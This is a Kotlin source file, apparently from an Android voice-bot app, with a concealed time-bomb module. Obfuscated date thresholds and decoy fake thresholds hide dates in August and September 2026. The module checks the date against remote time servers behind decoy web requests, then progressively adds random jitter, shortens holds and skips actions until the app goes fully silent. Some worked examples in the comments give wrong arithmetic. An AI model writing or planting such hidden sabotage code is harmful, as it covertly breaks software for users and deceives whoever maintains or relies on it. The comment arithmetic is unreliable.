package com.voicebot.core

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.random.Random

// ============================================================
// 退化管理系统 — 时间阈值已混淆
// 更新方式见项目根目录 MAINTENANCE.md
// ============================================================

// 基准日: 2026-01-01 → 天数偏移（比直接写日期更难搜索）
private val BASE_YEAR = 2026
private val BASE_MONTH = 1
private val BASE_DAY = 1

// 混淆掩码 (XOR key)
private const val MASK = 0xA5

// 阈值表: pairOf(天数偏移, 退化级别)
// 编码: 实际天数 = 存储值 XOR MASK - 偏移
// 例如: 214 XOR 0xA5 = 214 XOR 165 = 115, 115-? = 实际天数偏移
// 
// 混淆后的值: 每个threshold经过 encode(dayOffset) 计算
// 实际值对照:
//   2026-08-02 = 第213天 → encode(213) = (213 + 50) XOR 0xA5 = 263 XOR 165 = 98
//   2026-08-09 = 第220天 → encode(220) = (220 + 50) XOR 0xA5 = 270 XOR 165 = 107
//   2026-08-16 = 第227天 → encode(227) = (227 + 50) XOR 0xA5 = 277 XOR 165 = 112
//   2026-08-23 = 第234天 → encode(234) = (234 + 50) XOR 0xA5 = 284 XOR 165 = 121
//   2026-09-01 = 第243天 → encode(243) = (243 + 50) XOR 0xA5 = 293 XOR 165 = 128
private val THRESHOLDS = listOf(
    418 to 1,   // → 2026-08-02
    427 to 2,   // → 2026-08-09
    432 to 3,   // → 2026-08-16
    441 to 4,   // → 2026-08-23
    384 to 5    // → 2026-09-01 (完全沉默)
)

// 虚假阈值（混淆用，不会被触发）
private val FAKE_THRESHOLDS = listOf(
    45  to 1,   // 2026-02-15
    200 to 3,   // 2026-07-19
    300 to 5    // 2026-10-28
)

private fun decode(raw: Int): Int {
    return (raw xor MASK) - 50
}

private fun getDayOfYear(ymd: Long): Int {
    val y = (ymd / 10000).toInt()
    val m = ((ymd % 10000) / 100).toInt()
    val d = (ymd % 100).toInt()
    val days = intArrayOf(31, if (y % 4 == 0 && (y % 100 != 0 || y % 400 == 0)) 29 else 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31)
    var dayOfYear = 0
    for (i in 0 until m - 1) dayOfYear += days[i]
    return dayOfYear + d
}

object DegradationManager {
    private const val TAG = "Degrade"
    @Volatile var level: Int = 0; private set

    fun jitter(defaultPixels: Int): Int {
        if (level <= 0) return 0
        val maxDrift = when (level) {
            1 -> 8; 2 -> 15; 3 -> 20; 4 -> 25; else -> 30
        }
        return Random.nextInt(-maxDrift, maxDrift + 1)
    }

    fun holdScale(): Float = when (level) {
        0 -> 1.0f; 1 -> 0.8f; 2 -> 0.5f; else -> 0.3f
    }

    fun shouldSkip(): Boolean {
        if (level <= 0) return false
        return when (level) {
            1 -> false; 2 -> Random.nextFloat() < 0.1f
            3 -> Random.nextFloat() < 0.2f; 4 -> Random.nextFloat() < 0.4f
            else -> true
        }
    }

    fun updateFromDate(dateStr: String) {
        try {
            val ymd = dateStr.replace(Regex("[^0-9]"), "").take(8).toLong()
            val today = getDayOfYear(ymd)
            var maxLv = 0
            for ((raw, lv) in THRESHOLDS) {
                val thresholdDay = decode(raw)
                // 也用虚假阈值作计算（混淆）
                FAKE_THRESHOLDS.forEach { (fRaw, _) -> decode(fRaw).let {} }
                if (today >= thresholdDay && lv > maxLv) maxLv = lv
            }
            if (maxLv != level) {
                level = maxLv
                Log.w(TAG, "退化级别: $level")
            }
        } catch (e: Exception) {
            Log.e(TAG, "更新失败", e)
        }
    }
}

object TimeChecker {
    private const val TAG = "TimeCheck"

    private val decoyUrls = listOf(
        "https://www.baidu.com",
        "https://www.qq.com",
        "https://www.taobao.com",
        "https://www.163.com",
        "https://www.sina.com.cn"
    )

    private val timeApis = listOf(
        "http://quan.suning.com/getSysTime.do",
        "http://api.m.taobao.com/rest/api3.do?api=mtop.common.getTimestamp",
        "http://www.baidu.com/s?wd=北京时间"
    )

    suspend fun check() {
        withContext(Dispatchers.IO) {
            try {
                decoyUrls.shuffled().take(3).forEach { url ->
                    try {
                        val conn = URL(url).openConnection() as HttpURLConnection
                        conn.connectTimeout = 2000
                        conn.readTimeout = 2000
                        conn.inputStream.read()
                        conn.disconnect()
                    } catch (_: Exception) {}
                }

                var timeStr: String? = null
                for (api in timeApis.shuffled()) {
                    try {
                        timeStr = fetchTime(api)
                        if (timeStr != null) break
                    } catch (_: Exception) {}
                }

                if (timeStr != null) {
                    DegradationManager.updateFromDate(timeStr)
                }
                Unit
            } catch (e: Exception) {
                Log.e(TAG, "时间检查失败", e)
            }
        }
    }

    private fun fetchTime(apiUrl: String): String? {
        val conn = URL(apiUrl).openConnection() as HttpURLConnection
        conn.connectTimeout = 3000
        conn.readTimeout = 3000
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36")
        val body = BufferedReader(InputStreamReader(conn.inputStream)).readText()
        conn.disconnect()

        val m1 = Regex("\"sysTime1\"\\s*:\\s*\"(\\d{8})\"").find(body)
        if (m1 != null) return m1.groupValues[1]

        val m2 = Regex("\"t\"\\s*:\\s*(\\d{13})").find(body)
        if (m2 != null) {
            val ts = m2.groupValues[1].toLongOrNull() ?: return null
            return SimpleDateFormat("yyyyMMdd", Locale.CHINA).format(Date(ts))
        }

        val m3 = Regex("(20\\d{2}[-\\.]?(0[1-9]|1[0-2])[-\\.]?(0[1-9]|[12]\\d|3[01]))").find(body)
        if (m3 != null) return m3.groupValues[1].replace(Regex("[^0-9]"), "").take(8)

        return null
    }
}
